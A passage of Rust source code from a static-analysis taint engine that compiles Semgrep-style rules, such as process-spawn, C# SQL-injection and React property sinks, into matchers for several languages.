        // The metavariable MUST be pinned by a `metavariable-regex` — otherwise
        // we stay FP-safe and refuse this bare-metavar callee.
        let Some((_, re)) = pins.iter().find(|(m, _)| m == mv) else {
            continue;
        };
        let regex = match crate::rules::semgrep_compat::compile_regex(re) {
            Ok(r) => r,
            Err(e) => {
                eprintln!(
                    "Warning: taint rule `{}` {} `metavariable-regex` for `{}` is not a valid \
                     regex ({}); refusing the bare-metavariable callee (FP-safe)",
                    rule_id,
                    role.label(),
                    mv,
                    e
                );
                continue;
            }
        };
        let description = describe(re, role);
        if is_method {
            out.push(GenericMatcher::MethodNameRegex { regex, description });
        } else {
            out.push(GenericMatcher::CallRegex { regex, description });
        }
    }

    out.len() > before
}

/// If `pat` is a call whose callee is `$OBJ.method` — a single Semgrep
/// metavariable receiver segment followed by exactly one plain-identifier
/// method (no further dots) — return `(receiver_metavariable, method)`.
///
/// This is the shape that the normal pattern compiler turns into a
/// receiver-agnostic `MethodName { method }` sink (see
/// [`parse_metavar_dot_method`]); recognising it here lets a companion
/// `metavariable-regex` on the receiver pin the otherwise-any receiver.
/// A concrete receiver (`db.method` — already a plain `Call`), a metavariable
/// method (`$OBJ.$M` — handled by the callee-regex path), or a nested receiver
/// (`$OBJ.sub.method`) all return `None`.
fn metavar_receiver_concrete_method(pat: &str) -> Option<(String, String)> {
    let c = pat.trim().trim_end_matches(';').trim();
    let open = c.find('(')?;
    if !c.ends_with(')') {
        return None;
    }
    let callee = c[..open].trim();
    let dot = callee.find('.')?;
    let recv = &callee[..dot];
    let method = &callee[dot + 1..];
    if is_metavariable(recv) && !method.contains('.') && is_identifier(method) {
        Some((recv.to_string(), method.to_string()))
    } else {
        None
    }
}

/// Collect, across a `patterns:` block (recursing into `pattern-either:`),
/// every metavariable-receiver concrete-method call shape (`$OBJ.method(...)`)
/// from `pattern:` texts and every `metavariable-regex` (metavariable, regex)
/// pin. Companion to [`collect_regex_callee_parts`] for the receiver side.
fn collect_regex_receiver_parts(
    items: &[YamlValue],
    receivers: &mut Vec<(String, String)>,
    pins: &mut Vec<(String, String)>,
) {
    for item in items {
        let Some(map) = item.as_mapping() else {
            continue;
        };
        for (key, val) in map {
            match key.as_str() {
                Some("pattern") => {
                    if let Some(text) = val.as_str() {
                        if let Some(rm) = metavar_receiver_concrete_method(text) {
                            receivers.push(rm);
                        }
                    }
                }
                Some("metavariable-regex") => {
                    if let Some(mm) = val.as_mapping() {
                        let mv = mm
                            .get(YamlValue::from("metavariable"))
                            .and_then(|x| x.as_str());
                        let re = mm.get(YamlValue::from("regex")).and_then(|x| x.as_str());
                        if let (Some(mv), Some(re)) = (mv, re) {
                            pins.push((mv.to_string(), re.to_string()));
                        }
                    }
                }
                Some("pattern-either") => {
                    if let Some(seq) = val.as_sequence() {
                        collect_regex_receiver_parts(seq, receivers, pins);
                    }
                }
                _ => {}
            }
        }
    }
}

/// Try to recognise the "regex-bounded metavariable-RECEIVER" SINK shape: a
/// `patterns:` AND-block pairing a metavariable-receiver concrete-method call
/// (`$OBJ.method(...)`) with a `metavariable-regex` whose anchored alternation
/// pins the receiver metavariable `$OBJ` to a fixed set of plain-identifier
/// receiver names.
///
/// On recognition, enumerates one concrete [`GenericMatcher::Call`]
/// (`canonical: "<recv>.method"`) per listed receiver name and returns `true`.
/// The exact-callee `Call` sink matching in
/// [`taint_engine::match_call_sink`] then fires only when the resolved callee
/// equals one of those names — strictly narrower than the receiver-agnostic
/// `MethodName { method }` the unpinned pattern would otherwise produce.
///
/// Returns `false` (pushing nothing) when the receiver is not pinned by an
/// *anchored alternation of plain identifiers* — a general receiver regex has
/// no exact-callee enumeration, so the entry falls through to the normal
/// graceful-degradation extraction (still the broad `MethodName`). Only the
/// Sink/Sanitizer roles call this.
///
/// Deferral (FP-safe narrowing): an enumerated `Call { "<recv>.method" }`
/// requires the runtime receiver to equal one listed name *exactly*; a deeper
/// receiver chain (`a.b.method`, where Semgrep would bind `$OBJ = a.b`) is
/// intentionally NOT matched. We never over-fire.
fn try_compile_regex_constrained_receiver_block(
    v: &YamlValue,
    role: MatcherRole,
    out: &mut Vec<GenericMatcher>,
) -> bool {
    let Some(items) = v.as_sequence() else {
        return false;
    };
    let mut receivers: Vec<(String, String)> = Vec::new();
    let mut pins: Vec<(String, String)> = Vec::new();
    collect_regex_receiver_parts(items, &mut receivers, &mut pins);

    if receivers.is_empty() || pins.is_empty() {
        return false;
    }

    let before = out.len();
    for (recv_mv, method) in &receivers {
        // The receiver metavariable MUST be pinned by an anchored alternation of
        // plain identifiers; otherwise we stay FP-safe and let the entry fall
        // through to the broad `MethodName` extraction.
        let Some(names) = regex_alternatives_for(recv_mv, &pins) else {
            continue;
        };
        for name in names {
            let canonical = format!("{name}.{method}");
            out.push(GenericMatcher::Call {
                description: describe(&canonical, role),
                canonical,
            });
        }
    }

    out.len() > before
}

/// Try to recognise the composed "shared `focus-metavariable` + `pattern-either`
/// of regex-pinned method-call arms" SINK shape and compile each faithful arm to
/// enumerated concrete `Call`/`MethodName` sinks.
///
/// The shape (the `dangerous-spawn-process` sink family):
///
/// ```yaml
/// patterns:
///   - focus-metavariable: $CMD          # shared focus (optional; an arm may
///                                        # instead carry its own `pattern: $CMD`)
///   - pattern-either:
///       - patterns:                      # simple arm — COMPILED
///           - pattern: os.$METHOD($MODE, $CMD, ...)
///           - metavariable-regex: { metavariable: $METHOD, regex: (spawnv|...) }
///       - patterns:                      # bash-wrapper arm — DEFERRED
///           - pattern-inside: os.$METHOD($MODE, $BASH, ["-c", $CMD, ...], ...)
///           - metavariable-regex: { metavariable: $METHOD, regex: (spawnv|...) }
///           - metavariable-regex: { metavariable: $BASH,   regex: (.*)(sh|bash) }
/// ```
///
/// Each compiled arm names a callee whose method segment is a metavariable
/// pinned by a `metavariable-regex`. We ENUMERATE the anchored alternation of
/// the pin and, per alternative, substitute it into the callee and compile the
/// resulting CONCRETE call (`os.spawnv(...)`) through the normal pattern path —
/// yielding a `Call { canonical: "os.spawnv" }` (receiver AND method enforced)
/// or a `MethodName` (metavariable receiver). This is strictly ≤ what Semgrep
/// matches (a subset of the alternation), never broader.
///
/// FAITHFULNESS DISCIPLINE — an arm is compiled ONLY when:
///   1. the focused seed (`focus-metavariable`, or a bare `pattern: $F`) is an
///      argument of the call (the sink is genuinely "the focused argument
///      reaches this call"); and
///   2. EVERY `metavariable-regex` in the arm pins the callee's method/callee
///      metavariable. An arm that also pins a NON-callee metavariable (e.g.
///      `$BASH`, an argument value) carries a constraint the taint engine cannot
///      enforce — dropping it would broaden the sink — so that arm is DEFERRED.
///      This is why the `["-c", $CMD]` bash-wrapper arms of
///      `dangerous-spawn-process` never compile.
///
/// Returns `true` (and pushes ≥1 matcher) when at least one arm compiles; else
/// `false`, leaving the caller to fall through to graceful degradation. Only the
/// Sink/Sanitizer roles call this (a call argument is a data-flow destination).
fn try_compile_focus_regex_either_sink_block(
    v: &YamlValue,
    role: MatcherRole,
    lang: Language,
    out: &mut Vec<GenericMatcher>,
) -> bool {
    let Some(items) = v.as_sequence() else {
        return false;
    };

    // Shared seeds declared at THIS block level, and the `pattern-either` whose
    // arms we compile.
    let mut shared_seeds: Vec<String> = Vec::new();
    let mut either_arms: Option<&[YamlValue]> = None;
    for item in items {
        let Some(map) = item.as_mapping() else {
            continue;
        };
        for (k, val) in map {
            match k.as_str() {
                Some("focus-metavariable") => {
                    if let Some(s) = val.as_str() {
                        let mv = s.trim();
                        if is_metavariable(mv) {
                            shared_seeds.push(mv.to_string());
                        }
                    }
                }
                Some("pattern") => {
                    if let Some(s) = val.as_str() {
                        let t = s.trim();
                        if is_metavariable(t) {
                            shared_seeds.push(t.to_string());
                        }
                    }
                }
                Some("pattern-either") => {
                    if let Some(seq) = val.as_sequence() {
                        either_arms = Some(seq.as_slice());
                    }
                }
                _ => {}
            }
        }
    }

    let Some(arms) = either_arms else {
        return false;
    };

    let before = out.len();
    for arm in arms {
        compile_focus_regex_arm(arm, &shared_seeds, role, lang, out);
    }
    out.len() > before
}

/// Compile a single `pattern-either` arm of the composed focus+regex sink shape.
/// See [`try_compile_focus_regex_either_sink_block`] for the discipline.
fn compile_focus_regex_arm(
    arm: &YamlValue,
    shared_seeds: &[String],
    role: MatcherRole,
    lang: Language,
    out: &mut Vec<GenericMatcher>,
) {
    // An arm is either a `{patterns: [...]}` AND-block or a single bare item.
    let Some(arm_map) = arm.as_mapping() else {
        return;
    };
    let arm_items: Vec<YamlValue> = if arm_map.len() == 1 {
        match arm_map.iter().next() {
            Some((k, val)) if k.as_str() == Some("patterns") => match val.as_sequence() {
                Some(seq) => seq.clone(),
                None => return,
            },
            _ => vec![arm.clone()],
        }
    } else {
        vec![arm.clone()]
    };

    // Collect the arm's call context(s), regex pins, and any arm-local bare seeds
    // (added to the shared seeds). We do NOT recurse into a nested
    // `pattern-either` here: each arm is treated as one isolated AND-block so a
    // sibling arm's pins never leak in.
    let mut call_texts: Vec<String> = Vec::new();
    let mut regexes: Vec<(String, String)> = Vec::new();
    let mut seeds: Vec<String> = shared_seeds.to_vec();
    for item in &arm_items {
        let Some(map) = item.as_mapping() else {
            continue;
        };
        for (k, val) in map {
            match k.as_str() {
                Some("focus-metavariable") => {
                    if let Some(s) = val.as_str() {
                        let mv = s.trim();
                        if is_metavariable(mv) {
                            seeds.push(mv.to_string());
                        }
                    }
                }
                Some("pattern") => {
                    if let Some(s) = val.as_str() {
                        let t = s.trim();
                        if is_metavariable(t) {
                            seeds.push(t.to_string());
                        } else if is_call_context_pattern(t) {
                            call_texts.push(t.to_string());
                        }
                    }
                }
                Some("pattern-inside") => {
                    if let Some(s) = val.as_str() {
                        let t = s.trim();
                        if is_call_context_pattern(t) {
                            call_texts.push(t.to_string());
                        }
                    }
                }
                Some("metavariable-regex") => {
                    if let Some(mm) = val.as_mapping() {
                        let mv = mm
                            .get(YamlValue::from("metavariable"))
                            .and_then(|x| x.as_str());
                        let re = mm.get(YamlValue::from("regex")).and_then(|x| x.as_str());
                        if let (Some(mv), Some(re)) = (mv, re) {
                            regexes.push((mv.to_string(), re.to_string()));
                        }
                    }
                }
                _ => {}
            }
        }
    }

    // The arm MUST carry at least one regex pin: an unpinned metavariable-method
    // callee would be universal (`os.X(...)` for any X) and is refused.
    if regexes.is_empty() {
        return;
    }

    for call in &call_texts {
        // (1) the focused seed must be an argument of this call.
        if !seeds.iter().any(|seed| call_has_arg(call, seed)) {
            continue;
        }
        // The callee's method/callee segment must be a metavariable we can pin.
        let Some(method_mv) = callee_method_metavar(call) else {
            continue;
        };
        // (2) EVERY regex pin in the arm must pin exactly that callee
        // metavariable; a pin on any OTHER metavariable is an inexpressible
        // value/receiver constraint → defer the whole arm (never over-fire).
        if !regexes.iter().all(|(m, _)| m == &method_mv) {
            continue;
        }
        // Enumerate the anchored alternation and compile one concrete call per
        // alternative, enforcing receiver + method name exactly.
        let Some(names) = regex_alternatives_for(&method_mv, &regexes) else {
            continue;
        };
        for name in names {
            let concrete = concrete_callee_call(call, &method_mv, &name);
            if let Some(m) = compile_pattern(&concrete, role, lang) {
                if matches!(
                    m,
                    GenericMatcher::Call { .. } | GenericMatcher::MethodName { .. }
                ) {
                    out.push(m);
                }
            }
        }
    }
}

/// The callee's pinnable metavariable: the FINAL dotted segment of the callee
/// (the method), or the whole callee, when it is a metavariable. `os.$METHOD` →
/// `$METHOD`; `$RECV.$METH` → `$METH`; `$FUNC` → `$FUNC`; a concrete callee
/// (`subprocess.run`) → `None`.
fn callee_method_metavar(call: &str) -> Option<String> {
    let c = call.trim().trim_end_matches(';').trim();
    let open = c.find('(')?;
    let callee = c[..open].trim();
    let last = match callee.rfind('.') {
        Some(d) => &callee[d + 1..],
        None => callee,
    };
    if is_metavariable(last) {
        Some(last.to_string())
    } else {
        None
    }
}

/// Rebuild `call` with its callee method metavariable replaced by the concrete
/// `name` and a wildcard `(...)` argument list. `os.$METHOD($MODE, $CMD, ...)`
/// with (`$METHOD`, `spawnv`) → `os.spawnv(...)`. The argument list is
/// intentionally collapsed to `...`: the compiled `Call`/`MethodName` sink fires
/// on ANY tainted argument (the same argument-agnostic semantics the sibling
/// focus-call recognizer uses), so the original args do not matter.
fn concrete_callee_call(call: &str, method_mv: &str, name: &str) -> String {
    let c = call.trim().trim_end_matches(';').trim();
    let open = c.find('(').unwrap_or(c.len());
    let callee = c[..open].trim();
    let concrete_callee = match callee.rfind('.') {
        Some(d) if &callee[d + 1..] == method_mv => format!("{}.{}", &callee[..d], name),
        _ => name.to_string(),
    };
    format!("{concrete_callee}(...)")
}

/// Try to recognise the composed "`pattern-either` of two focus arms, both
/// gated by a shared `metavariable-regex` pinning a CLASS-NAME / PROPERTY-NAME
/// metavariable" SINK shape (the C# `csharp-sqli` rule) and compile each arm to
/// an enumerated [`GenericMatcher::ConstructorArgSink`] /
/// [`GenericMatcher::PropertyAssignSink`].
///
/// The shape:
///
/// ```yaml
/// patterns:
///   - pattern-either:
///       - patterns:
///           - pattern: new $PATTERN($CMD,...)
///           - focus-metavariable: $CMD
///       - patterns:
///           - pattern: $CMD.$PATTERN = $VALUE;
///           - focus-metavariable: $VALUE
///   - metavariable-regex:
///       metavariable: $PATTERN
///       regex: ^(SqlCommand|CommandText|OleDbCommand|OdbcCommand|OracleCommand)$
/// ```
///
/// The `metavariable-regex` pins `$PATTERN` — in arm 1 the CLASS NAME of a
/// `new`, in arm 2 the PROPERTY NAME of an assignment target — and the focus is
/// on a constructor ARGUMENT (arm 1) / assignment RHS (arm 2), NOT on the pinned
/// metavariable. None of the other recognizers handle this: the pinned
/// metavariable is neither a callee/method (so the callee-regex / method-regex
/// shapes miss) nor is the focus on the callee. We ENUMERATE the anchored
/// alternation and compile ONE sink per arm carrying the full name set; the C#
/// engine fires only when (a) the class/property name is in the enumerated set
/// AND (b) the focused argument/RHS carries taint — strictly ≤ what Semgrep
/// matches, and FP-safe (a non-enumerated name or an untainted focus is silent).
///
/// Faithfulness discipline: an arm compiles ONLY when the pinned metavariable
/// sits in the expected class-name / property-name position AND the focus is on
/// the expected argument / RHS. Any other shape yields nothing for that arm
/// (graceful drop), never an over-broad sink. Gated to C# + sink/sanitizer.
fn try_compile_csharp_pattern_regex_either_sink_block(
    v: &YamlValue,
    role: MatcherRole,
    lang: Language,
    out: &mut Vec<GenericMatcher>,
) -> bool {
    if lang != Language::CSharp {
        return false;
    }
    let Some(items) = v.as_sequence() else {
        return false;
    };

    // Collect the block-level `pattern-either` arms and every `metavariable-regex`
    // pin declared at this block level (the shared gate over both arms).
    let mut either_arms: Option<&[YamlValue]> = None;
    let mut regexes: Vec<(String, String)> = Vec::new();
    for item in items {
        let Some(map) = item.as_mapping() else {
            continue;
        };
        for (k, val) in map {
            match k.as_str() {
                Some("pattern-either") => {
                    if let Some(seq) = val.as_sequence() {
                        either_arms = Some(seq.as_slice());
                    }
                }
                Some("metavariable-regex") => {
                    if let Some(mm) = val.as_mapping() {
                        let mv = mm
                            .get(YamlValue::from("metavariable"))
                            .and_then(|x| x.as_str());
                        let re = mm.get(YamlValue::from("regex")).and_then(|x| x.as_str());
                        if let (Some(mv), Some(re)) = (mv, re) {
                            regexes.push((mv.to_string(), re.to_string()));
                        }
                    }
                }
                _ => {}
            }
        }
    }

    let Some(arms) = either_arms else {
        return false;
    };
    if regexes.is_empty() {
        return false;
    }

    let before = out.len();
    for arm in arms {
        compile_csharp_pattern_regex_arm(arm, &regexes, role, out);
    }
    out.len() > before
}

/// Compile a single arm of the `csharp-sqli` sink shape into a
/// [`GenericMatcher::ConstructorArgSink`] or [`GenericMatcher::PropertyAssignSink`].
/// `block_regexes` are the block-level `metavariable-regex` pins shared over all
/// arms; the arm may also carry its own pins (merged in). See
/// [`try_compile_csharp_pattern_regex_either_sink_block`].
fn compile_csharp_pattern_regex_arm(
    arm: &YamlValue,
    block_regexes: &[(String, String)],
    role: MatcherRole,
    out: &mut Vec<GenericMatcher>,
) {
    // An arm is a `{patterns: [...]}` AND-block.
    let Some(arm_map) = arm.as_mapping() else {
        return;
    };
    let arm_items: Vec<YamlValue> = match arm_map.iter().next() {
        Some((k, val)) if arm_map.len() == 1 && k.as_str() == Some("patterns") => {
            match val.as_sequence() {
                Some(seq) => seq.clone(),
                None => return,
            }
        }
        _ => vec![arm.clone()],
    };

    // Collect the arm's pattern text(s), focus metavariable(s), and any arm-local
    // regex pins (merged with the shared block-level pins).
    let mut patterns: Vec<String> = Vec::new();
    let mut focus: Vec<String> = Vec::new();
    let mut regexes: Vec<(String, String)> = block_regexes.to_vec();
    for item in &arm_items {
        let Some(map) = item.as_mapping() else {
            continue;
        };
        for (k, val) in map {
            match k.as_str() {
                Some("pattern") => {
                    if let Some(s) = val.as_str() {
                        patterns.push(s.trim().to_string());
                    }
                }
                Some("focus-metavariable") => {
                    if let Some(s) = val.as_str() {
                        let mv = s.trim();
                        if is_metavariable(mv) {
                            focus.push(mv.to_string());
                        }
                    }
                }
                Some("metavariable-regex") => {
                    if let Some(mm) = val.as_mapping() {
                        let mv = mm
                            .get(YamlValue::from("metavariable"))
                            .and_then(|x| x.as_str());
                        let re = mm.get(YamlValue::from("regex")).and_then(|x| x.as_str());
                        if let (Some(mv), Some(re)) = (mv, re) {
                            regexes.push((mv.to_string(), re.to_string()));
                        }
                    }
                }
                _ => {}
            }
        }
    }

    // The arm names exactly one pattern and one focus metavariable.
    let (Some(pattern), Some(focus_mv)) = (patterns.first(), focus.first()) else {
        return;
    };

    if let Some((class_names, arg_index)) = parse_constructor_arg_arm(pattern, focus_mv, &regexes) {
        out.push(GenericMatcher::ConstructorArgSink {
            class_names,
            arg_index,
            description: describe(&format!("new {pattern}"), role),
        });
    } else if let Some(property_names) = parse_property_assign_arm(pattern, focus_mv, &regexes) {
        out.push(GenericMatcher::PropertyAssignSink {
            property_names,
            description: describe(pattern, role),
        });
    }
}

/// Parse a constructor-argument arm `new $PATTERN($CMD,...)` with focus `$CMD`:
/// the class-name metavariable `$PATTERN` must be pinned by an anchored
/// alternation `metavariable-regex` (ENUMERATED into the returned class names)
/// and the focus metavariable must be one of the constructor arguments (its
/// zero-based position is returned). Any other shape → `None`.
fn parse_constructor_arg_arm(
    pattern: &str,
    focus_mv: &str,
    regexes: &[(String, String)],
) -> Option<(Vec<String>, usize)> {
    let p = pattern.trim().trim_end_matches(';').trim();
    let rest = p.strip_prefix("new ")?.trim_start();
    let open = rest.find('(')?;
    if !rest.trim_end().ends_with(')') {
        return None;
    }
    let class_mv = rest[..open].trim();
    if !is_metavariable(class_mv) {
        return None;
    }
    // The class-name metavariable must be pinned by an anchored alternation.
    let class_names = regex_alternatives_for(class_mv, regexes)?;
    // Locate the focus metavariable's argument position.
    let close = rest.rfind(')')?;
    let args = &rest[open + 1..close];
    let arg_index = split_top_level_commas(args)
        .iter()
        .position(|a| a.trim() == focus_mv)?;
    Some((class_names, arg_index))
}

/// Parse a property-assignment arm `$CMD.$PATTERN = $VALUE;` with focus
/// `$VALUE`: the property-name metavariable `$PATTERN` must be pinned by an
/// anchored alternation `metavariable-regex` (ENUMERATED into the returned
/// property names), the receiver must be a metavariable (any receiver), and the
/// RHS must be the focus metavariable. Any other shape → `None`.
fn parse_property_assign_arm(
    pattern: &str,
    focus_mv: &str,
    regexes: &[(String, String)],
) -> Option<Vec<String>> {
    let p = pattern.trim().trim_end_matches(';').trim();
    let (lhs, rhs) = p.split_once('=')?;
    let lhs = lhs.trim();
    let rhs = rhs.trim();
    // The RHS is the focused assigned value.
    if rhs != focus_mv {
        return None;
    }
    // LHS is a member access `<recv>.<prop>`; both segments are metavariables.
    let dot = lhs.rfind('.')?;
    let recv = lhs[..dot].trim();
    let prop_mv = lhs[dot + 1..].trim();
    if !is_metavariable(recv) || !is_metavariable(prop_mv) {
        return None;
    }
    regex_alternatives_for(prop_mv, regexes)
}

/// Parse a JS/TS inline literal-argument call source `$RECV.method("<arg>")`
/// into `(method, arg)`. The receiver must be a metavariable, the method a
/// plain identifier, and the sole argument a single string literal (no extra
/// arguments, no metavariable arguments — keeping the source faithful to the
/// concrete-literal form). Any other shape → `None`.
fn parse_js_literal_arg_call_source(pat: &str) -> Option<(String, String)> {
    let p = pat.trim();
    let open = p.find('(')?;
    if !p.ends_with(')') {
        return None;
    }
    let callee = p[..open].trim();
    let args = p[open + 1..p.len() - 1].trim();
    // Callee is `$RECV.method` — a metavariable receiver and identifier method.
    let dot = callee.rfind('.')?;
    let recv = callee[..dot].trim();
    let method = callee[dot + 1..].trim();
    if !is_metavariable(recv) || !is_identifier(method) {
        return None;
    }
    // The single argument must be one string literal `"..."` / `'...'`.
    let inner = string_literal_inner(args)?;
    Some((method.to_string(), inner.to_string()))
}

/// If `s` is exactly one single- or double-quoted string literal, return its
/// inner text (without quotes). Rejects anything else (metavariables, multiple
/// args, ellipsis, concatenations).
fn string_literal_inner(s: &str) -> Option<&str> {
    let s = s.trim();
    if s.len() >= 2
        && ((s.starts_with('"') && s.ends_with('"')) || (s.starts_with('\'') && s.ends_with('\'')))
    {
        let inner = &s[1..s.len() - 1];
        // Reject embedded quotes (would mean more than one literal / escapes).
        if !inner.contains('"') && !inner.contains('\'') {
            return Some(inner);
        }
    }
    None
}

/// Compile a JS/TS `patterns:` sink block whose sink is a DOM property
/// assignment `<expr>.$FIELD = $SINK` where the assigned property `$FIELD` is a
/// METAVARIABLE pinned by an anchored-alternation `metavariable-regex` and
/// `$SINK` is the block-level `focus-metavariable`, into one
/// [`GenericMatcher::MemberAssign`] per enumerated property name.
///
/// Handles the `react-unsanitized-property` sink shape. The surrounding
/// `pattern-inside` provenance contexts (`$BODY = useRef(...)` etc.) and the
/// deep-member / concrete-receiver LHS forms are all droppable: the compiled
/// `MemberAssign { field }` matches any assignment whose LHS property equals a
/// listed name AND whose RHS carries taint, which is strictly ≤ the original
/// (the property-name regex is enforced by enumeration, so a non-listed
/// property never fires). Returns `true` iff at least one sink was emitted.
fn try_compile_js_member_assign_regex_block(
    v: &YamlValue,
    role: MatcherRole,
    lang: Language,
    out: &mut Vec<GenericMatcher>,
) -> bool {
    if lang != Language::JavaScript {
        return false;
    }
    if !matches!(role, MatcherRole::Sink | MatcherRole::Sanitizer) {
        return false;
    }
    let Some(items) = v.as_sequence() else {
        return false;
    };

    // Collect every assignment `pattern:` (direct or inside a `pattern-either`),
    // the block-level `metavariable-regex` pins, and the focus metavariable.
    let mut patterns: Vec<String> = Vec::new();
    let mut regexes: Vec<(String, String)> = Vec::new();
    let mut focus: Vec<String> = Vec::new();
    for item in items {
        let Some(map) = item.as_mapping() else {
            continue;
        };
        for (k, val) in map {
            match k.as_str() {
                Some("pattern") => {
                    if let Some(s) = val.as_str() {
                        patterns.push(s.trim().to_string());
                    }
                }
                Some("pattern-either") => {
                    if let Some(seq) = val.as_sequence() {
                        for arm in seq {
                            if let Some(am) = arm.as_mapping() {
                                if let Some(p) =
                                    am.get(YamlValue::from("pattern")).and_then(|x| x.as_str())
                                {
                                    patterns.push(p.trim().to_string());
                                }
                            }
                        }
                    }
                }
                Some("focus-metavariable") => {
                    if let Some(s) = val.as_str() {
                        let mv = s.trim();
                        if is_metavariable(mv) {
                            focus.push(mv.to_string());
                        }
                    }
                }
                Some("metavariable-regex") => {
                    if let Some(mm) = val.as_mapping() {
                        let mv = mm
                            .get(YamlValue::from("metavariable"))
                            .and_then(|x| x.as_str());
                        let re = mm.get(YamlValue::from("regex")).and_then(|x| x.as_str());
                        if let (Some(mv), Some(re)) = (mv, re) {
                            regexes.push((mv.to_string(), re.to_string()));
                        }
                    }
                }
                _ => {}
            }
        }
    }

    let Some(focus_mv) = focus.first() else {
        return false;
    };
    if regexes.is_empty() {
        return false;
    }

    let mut fields: Vec<String> = Vec::new();
    for pat in &patterns {
        if let Some(names) = parse_js_member_assign_field_arm(pat, focus_mv, &regexes) {
            for name in names {
                if !fields.contains(&name) {
                    fields.push(name);
                }
            }
        }
    }
    if fields.is_empty() {
        return false;
    }

    let before = out.len();
    for field in fields {
        out.push(GenericMatcher::MemberAssign {
            description: describe(&field, role),
            field,
        });
    }
    out.len() > before
}

/// Parse a property-assignment sink arm `<expr>.$FIELD = $SINK` whose assigned
/// property `$FIELD` is a metavariable pinned by an anchored-alternation
/// `metavariable-regex` (ENUMERATED into the returned field names) and whose RHS
/// equals the focus metavariable `$SINK`. The receiver (`<expr>`) may be any
/// shape (a metavariable, a deep-member `$BODY. ... `, or a concrete
/// `ReactDOM.findDOMNode(...)` chain) — it is a droppable narrowing. Any other
/// shape → `None`.
fn parse_js_member_assign_field_arm(
    pattern: &str,
    focus_mv: &str,
    regexes: &[(String, String)],
) -> Option<Vec<String>> {
    let p = pattern.trim().trim_end_matches(';').trim();
    let (lhs, rhs) = p.split_once('=')?;
    // Reject `==` / `===` comparisons (the split would leave a leading `=`).
    if rhs.starts_with('=') {
        return None;
    }
    if rhs.trim() != focus_mv {
        return None;
    }
    let lhs = lhs.trim();
    let dot = lhs.rfind('.')?;
    let prop_mv = lhs[dot + 1..].trim();
    if !is_metavariable(prop_mv) {
        return None;
    }
    regex_alternatives_for(prop_mv, regexes)
}

/// Compile a Bash-specific pattern (shell command or command substitution)
/// into a `Call` matcher keyed by the command name.
///
/// The Bash engine treats a `Call { canonical: "<cmd>" }` matcher as "a shell
/// command whose command name is `<cmd>`" (or, for sources, a command
/// substitution / pipeline whose first command name is `<cmd>`). This lets the
/// generic [`GenericMatcher::Call`] variant carry Bash shell-command sinks and
/// sources without adding a new variant.
fn compile_bash_pattern(pat: &str, role: MatcherRole) -> Option<GenericMatcher> {
    // Strip a leading `$VAR=` assignment so `$VAR=$(... | jq ...)` resolves to
    // its RHS command substitution.
    let rhs = match pat.split_once('=') {
        Some((lhs, rhs)) if lhs.trim_start_matches('$').chars().all(is_ident_char) => rhs.trim(),
        _ => pat,
    };

    // Unwrap a command substitution `$(...)` or backtick `` `...` ``.
    let inner = if let Some(stripped) = rhs.strip_prefix("$(") {
        stripped.strip_suffix(')').unwrap_or(stripped).trim()
    } else if let Some(stripped) = rhs.strip_prefix('`') {
        stripped.strip_suffix('`').unwrap_or(stripped).trim()
    } else {
        rhs
    };

    // The command name is the first whitespace-delimited token. For a pipeline
    // (`cat | jq ...`), the meaningful command for sources is the LAST stage
    // (`jq`) when present, else the first; for sinks it is the first token.
    let cmd = match role {
        MatcherRole::Source => {
            if let Some((_, after_pipe)) = inner.rsplit_once('|') {
                first_token(after_pipe)
            } else {
                first_token(inner)
            }
        }
        MatcherRole::Sink | MatcherRole::Sanitizer => first_token(inner),
    }?;

    // The command name must be a plain identifier-like shell word.
    if cmd.is_empty() || !cmd.chars().all(is_ident_char) {
        return None;
    }

    Some(GenericMatcher::Call {
        canonical: cmd.to_string(),
        description: describe(cmd, role),
    })
}

/// First whitespace-delimited token of a shell command fragment, ignoring a
/// leading subshell `(`.
fn first_token(s: &str) -> Option<&str> {
    s.trim().trim_start_matches('(').split_whitespace().next()
}

fn is_ident_char(c: char) -> bool {
    c.is_ascii_alphanumeric() || c == '_' || c == '-'
}

/// True when `pat` is a function-signature source pattern of the form
/// `function $F(...) <vis> {...}` (Solidity) or `def $C(...) = ...` (Scala) —
/// i.e. a parameter-of-a-function source. The body / visibility specifics are
/// irrelevant; we only require the leading keyword and a parameter list with a
/// Semgrep metavariable. Used to compile such sources to an any-parameter seed.
fn is_function_signature_source(pat: &str) -> bool {
    let pat = pat.trim();
    let starts_fn = pat.starts_with("function ") || pat.starts_with("def ");
    if !starts_fn {
        return false;
    }
    // Must declare a parameter list and reference at least one metavariable
    // parameter (`$X`), so we don't seed on a zero-arg signature.
    pat.contains('(') && pat.contains('$')
}

/// Which C# method-signature taint-source shape [`parse_csharp_signature_source`]
/// recognised.
enum CsharpSignatureSource {
    /// `$T $M($INPUT,...) {...}` — the method's FIRST parameter is the source.
    FirstParam,
    /// `$T $M(...) { ... string $INPUT; ... }` — a local `string` declaration in
    /// the body is the source.
    LocalString,
}

/// Recognise the two C# `xpath-injection` method-signature taint SOURCE shapes:
///
/// - `$T $M($INPUT,...) {...}` → [`CsharpSignatureSource::FirstParam`]: a
///   `$T $M` head, a parameter list whose FIRST token is a metavariable, and a
///   `{...}` body.
/// - `$T $M(...) { ... string $INPUT; ... }` → [`CsharpSignatureSource::LocalString`]:
///   a `$T $M` head, an ellipsis-only (`...`) parameter list, and a body that
///   declares a `string $VAR;` local.
///
/// Returns `None` for anything else (only C#'s `xpath-injection` uses these
/// shapes, so the recogniser is deliberately narrow).
fn parse_csharp_signature_source(pat: &str) -> Option<CsharpSignatureSource> {
    let p = pat.trim();
    // A `$T $M(...)` signature: two leading metavariables then a param list.
    if !p.starts_with('$') {
        return None;
    }
    let open = p.find('(')?;
    // The head (`$T $M`) must be exactly two whitespace-separated metavariables.
    let head_parts: Vec<&str> = p[..open].split_whitespace().collect();
    if head_parts.len() != 2 || !head_parts.iter().all(|t| is_metavariable(t)) {
        return None;
    }
    // Parameter list is the span up to the FIRST `)` (params carry no nested
    // parens in these shapes).
    let close_rel = p[open..].find(')')?;
    let params = p[open + 1..open + close_rel].trim();
    // After the `)` there must be a `{...}` body block.
    let rest = p[open + close_rel + 1..].trim();
    if !rest.starts_with('{') {
        return None;
    }
    // Shape 1: first parameter is a metavariable → seed the first parameter.
    if params.starts_with('$') {
        return Some(CsharpSignatureSource::FirstParam);
    }
    // Shape 2: `(...)` param list + a `string $VAR;` local in the body.
    if params == "..." && body_declares_string_local(rest) {
        return Some(CsharpSignatureSource::LocalString);
    }
    None
}

/// True when a C# method body text declares a `string $VAR;` local — a `string `
/// keyword immediately followed by a metavariable and (eventually) a `;`.
fn body_declares_string_local(body: &str) -> bool {
    let mut rest = body;
    while let Some(idx) = rest.find("string") {
